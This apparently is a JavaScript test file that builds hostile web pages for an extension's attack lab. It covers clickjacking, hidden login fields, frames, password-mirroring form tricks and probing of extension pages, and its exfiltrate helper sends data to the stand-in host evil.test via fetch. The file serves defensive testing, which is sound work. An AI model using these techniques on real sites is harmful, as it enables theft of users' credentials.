// Hostile pages for the extension's attack lab (docs/EXTENSION.md, design
// section 8.3). case.html?c=<name> builds one case. Every page keeps a spy:
// window.__lab.values() lists every input (also in open shadow roots) with its
// value, window.__lab.log records what the page saw (events, focus, clicks,
// what it tried to send).

(() => {
  const stage = document.getElementById("stage");
  const log = [];
  const el = (tag, props = {}, style = "") => {
    const node = document.createElement(tag);
    Object.assign(node, props);
    if (style) node.style.cssText = style;
    return node;
  };
  const loginForm = (prefix = "", style = "", fieldStyle = "") => {
    const form = el("form", { id: `${prefix}form` }, style);
    form.append(
      el("input", { id: `${prefix}user`, name: "login", autocomplete: "username" }, fieldStyle),
      el(
        "input",
        {
          id: `${prefix}pass`,
          name: "password",
          type: "password",
          autocomplete: "current-password",
        },
        fieldStyle
      )
    );
    return form;
  };
  const exfiltrate = (what) => {
    log.push(["exfiltrate", what]);
    // A real attacker would send it away; the lab records the attempt and makes
    // the request so the test can see network traffic leave the page.
    fetch(`https://evil.test/collect?what=${encodeURIComponent(what)}`, { mode: "no-cors" }).catch(
      () => {}
    );
  };
  const decoy = (text = "Accept cookies") => {
    const button = el("div", { className: "decoy", textContent: text });
    button.addEventListener("click", () => log.push(["decoy-click"]));
    return button;
  };

  const cases = {
    // --- 1. DOM-based extension clickjacking (Tóth, DEF CON 33) -------------
    "cj-opacity-html": () => {
      document.documentElement.style.opacity = "0";
      stage.append(loginForm(), decoy());
    },
    "cj-opacity-body": () => {
      document.body.style.opacity = "0.05";
      stage.append(loginForm(), decoy());
    },
    "cj-opacity-parent": () => stage.append(loginForm("", "opacity:0"), decoy()),
    "cj-overlay": () => {
      stage.append(loginForm());
      document.body.append(
        el(
          "div",
          { id: "overlay", textContent: "Click anywhere to continue" },
          "position:fixed;inset:0;background:white;z-index:2147483647;padding:40px"
        )
      );
    },
    "cj-pointer-events": () => {
      stage.append(loginForm());
      const veil = el(
        "div",
        { id: "veil" },
        "position:fixed;inset:0;background:rgba(255,255,255,.98);pointer-events:none;z-index:9"
      );
      veil.append(decoy("Claim your prize"));
      document.body.append(veil);
    },
    "cj-clip-path": () => stage.append(loginForm("", "clip-path:inset(50%)"), decoy()),
    "cj-mask": () =>
      stage.append(loginForm("", "mask-image:linear-gradient(transparent,transparent)"), decoy()),
    "cj-popover": () => {
      stage.append(loginForm());
      const top = el("div", { id: "top", popover: "manual", textContent: "Win a prize!" });
      top.style.cssText = "inset:0;width:100vw;height:100vh;margin:0;border:0";
      document.body.append(top);
      top.showPopover();
    },
    "cj-cookie-banner": () => {
      stage.append(loginForm());
      const banner = el(
        "div",
        {},
        "position:fixed;left:0;right:0;bottom:0;padding:24px;background:#111;color:#fff;z-index:5"
      );
      banner.append("We use cookies. ", decoy("Accept all"));
      document.body.append(banner);
    },

    // --- 2. Hidden-field harvesting -------------------------------------------
    "hf-display-none": () => stage.append(loginForm("", "display:none")),
    "hf-visibility-hidden": () => stage.append(loginForm("", "visibility:hidden")),
    "hf-opacity-0": () => stage.append(loginForm("", "", "opacity:0")),
    "hf-opacity-ancestor": () => {
      const outer = el("div", {}, "opacity:0.3");
      const inner = el("div", {}, "opacity:0.2");
      inner.append(loginForm());
      outer.append(inner);
      stage.append(outer);
    },
    "hf-filter-opacity": () => stage.append(loginForm("", "filter:opacity(0.02)")),
    "hf-size-0": () => stage.append(loginForm("", "", "width:0;height:0;padding:0;border:0")),
    "hf-size-1": () => stage.append(loginForm("", "", "width:1px;height:1px;padding:0;border:0")),
    "hf-offscreen": () => stage.append(loginForm("", "position:absolute;left:-10000px;top:0")),
    "hf-clip": () =>
      stage.append(loginForm("", "position:absolute;clip:rect(0 0 0 0);overflow:hidden")),
    "hf-behind": () => {
      const wrap = el("div", {}, "position:relative");
      wrap.append(
        loginForm(),
        el(
          "div",
          { textContent: "Newsletter" },
          "position:absolute;inset:0;background:#fff;z-index:2"
        )
      );
      stage.append(wrap);
    },
    "hf-aria-hidden": () => {
      const box = el("div", {});
      box.setAttribute("aria-hidden", "true");
      box.append(loginForm());
      stage.append(box);
    },
    "hf-template": () => {
      const template = el("template");
      template.content.append(loginForm());
      stage.append(template);
    },
    "hf-late": () => {
      stage.append(el("p", { textContent: "Loading…" }));
      setTimeout(() => stage.append(loginForm()), 2500);
    },
    "hf-username-step": () => {
      // Google and Amazon style: email step with a hidden password field.
      const form = el("form");
      const pass = el(
        "input",
        { id: "pass", type: "password", name: "hiddenPassword", tabIndex: -1 },
        "position:absolute;left:-9999px;width:1px;height:1px"
      );
      pass.setAttribute("aria-hidden", "true");
      form.append(el("input", { id: "user", type: "email", autocomplete: "username" }), pass);
      stage.append(form);
    },
    "hf-formless-search": () => {
      // A password step without a <form> and no username field: the header's
      // search box (also formless) must not get the username.
      stage.append(
        el("input", { id: "search", type: "text", name: "q", placeholder: "Search" }),
        el("p", { textContent: "Enter your password" }),
        el("input", { id: "pass", type: "password", autocomplete: "current-password" })
      );
    },
    "hf-formless-login": () => {
      // A single-page app login without a <form>: both fields are filled.
      stage.append(
        el("input", { id: "search", type: "text", name: "q", placeholder: "Search" }),
        el("input", { id: "user", type: "text", name: "login_name" }),
        el("input", { id: "pass", type: "password" })
      );
    },
    "hf-mixed": () => {
      stage.append(loginForm("hidden-", "display:none"), loginForm("visible-"));
    },

    // --- 3. Frames --------------------------------------------------------------
    "if-attacker-child": () =>
      stage.append(
        el("iframe", { src: "https://evil.test/lab/iframe-form.html" }, "width:400px;height:240px")
      ),
    "if-framing-victim": () =>
      stage.append(
        el("iframe", { src: "https://github.test/login.html" }, "width:500px;height:400px")
      ),
    "if-same-origin": () =>
      stage.append(el("iframe", { src: "/lab/iframe-form.html" }, "width:400px;height:240px")),
    "if-sandboxed": () => {
      const frame = el("iframe", { src: "/lab/iframe-form.html" }, "width:400px;height:240px");
      frame.setAttribute("sandbox", "allow-scripts");
      stage.append(frame);
    },
    "if-srcdoc": () => {
      const frame = el("iframe", {}, "width:400px;height:240px");
      frame.setAttribute(
        "srcdoc",
        '<input id="user" autocomplete="username"><input id="pass" type="password">'
      );
      stage.append(frame);
    },

    // --- 5. Form tricks ---------------------------------------------------------
    "ft-autofocus-steal": () => {
      const notes = el("input", { id: "notes", placeholder: "Notes" });
      stage.append(loginForm(), notes);
      for (const id of ["user", "pass"]) {
        document.getElementById(id).addEventListener("focus", () => notes.focus());
      }
      notes.focus();
    },
    "ft-type-flip": () => {
      stage.append(loginForm());
      document.getElementById("pass").addEventListener("input", (e) => {
        e.target.type = "text";
        log.push(["type-flipped"]);
      });
    },
    "ft-new-password": () => {
      const form = el("form");
      form.append(
        el("input", { id: "user", autocomplete: "username" }),
        el("input", { id: "new", type: "password", autocomplete: "new-password" }),
        el("input", { id: "confirm", type: "password", autocomplete: "new-password" })
      );
      stage.append(form);
    },
    "ft-readonly-flip": () => {
      stage.append(loginForm());
      for (const id of ["user", "pass"]) {
        const input = document.getElementById(id);
        input.readOnly = true;
        input.addEventListener("focus", () => (input.readOnly = false));
      }
    },
    "ft-mirror": () => {
      const mirror = el("input", { id: "mirror", type: "hidden" });
      stage.append(loginForm(), mirror);
      document.getElementById("pass").addEventListener("input", (e) => {
        mirror.value = e.target.value;
        exfiltrate("mirror");
      });
    },
    "ft-mutation-exfil": () => {
      stage.append(loginForm());
      new MutationObserver((records) =>
        exfiltrate(
          `mutation:${records.map((r) => `${r.type}/${r.target.nodeName}/${r.attributeName}`).join(",")}`
        )
      ).observe(stage, {
        subtree: true,
        attributes: true,
        childList: true,
      });
      for (const id of ["user", "pass"]) {
        document.getElementById(id).addEventListener("input", () => exfiltrate(`input-${id}`));
      }
    },

    // --- 6. Messaging ------------------------------------------------------------
    "msg-runtime": () => {
      stage.append(loginForm());
      const runtime = globalThis.chrome && globalThis.chrome.runtime;
      log.push(["runtime", Boolean(runtime && runtime.sendMessage)]);
      if (runtime && runtime.sendMessage) {
        try {
          runtime.sendMessage(
            new URLSearchParams(location.search).get("id"),
            { type: "status" },
            (r) => log.push(["reply", r === undefined ? "none" : "some"])
          );
        } catch (error) {
          log.push(["threw", String(error)]);
        }
      }
    },

    // --- 7. Synthetic input -------------------------------------------------------
    "syn-keys": () => {
      stage.append(loginForm());
      const press = (init) => {
        document.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, ...init }));
        document.getElementById("user").dispatchEvent(new KeyboardEvent("keydown", init));
      };
      for (const init of [
        { key: "L", code: "KeyL", ctrlKey: true, shiftKey: true },
        { key: "L", code: "KeyL", metaKey: true, shiftKey: true },
        { key: "M", code: "KeyM", altKey: true, shiftKey: true },
      ]) {
        press(init);
      }
      document.getElementById("user").click();
      document.getElementById("pass").click();
      log.push(["pressed"]);
    },

    // --- 8. Extension pages ---------------------------------------------------------
    "ext-pages": () => {
      const id = new URLSearchParams(location.search).get("id");
      const frame = el(
        "iframe",
        { src: `chrome-extension://${id}/popup.html` },
        "width:360px;height:300px"
      );
      frame.addEventListener("load", () => {
        try {
          log.push(["frame-load", frame.contentDocument ? "readable" : "opaque"]);
        } catch {
          log.push(["frame-load", "opaque"]);
        }
      });
      stage.append(frame);
      for (const file of ["manifest.json", "popup.html", "background.js", "bridge.js"]) {
        fetch(`chrome-extension://${id}/${file}`)
          .then((r) => log.push(["fetch", file, r.status]))
          .catch(() => log.push(["fetch", file, "refused"]));
      }
    },
  };

  const name = new URLSearchParams(location.search).get("c");
  document.getElementById("title").textContent = `Attack lab: ${name}`;
  (cases[name] || (() => stage.append(loginForm())))();

  const inputs = () => {
    const found = [];
    const walk = (root) => {
      for (const node of root.querySelectorAll("*")) {
        if (node instanceof HTMLInputElement) found.push(node);
        if (node.shadowRoot) walk(node.shadowRoot);
      }
    };
    walk(document);
    return found;
  };
  window.__lab = {
    log,
    values: () => inputs().map((input) => ({ id: input.id, value: input.value })),
    filled: () =>
      inputs()
        .filter((input) => input.value !== "")
        .map((input) => input.id),
  };
})();
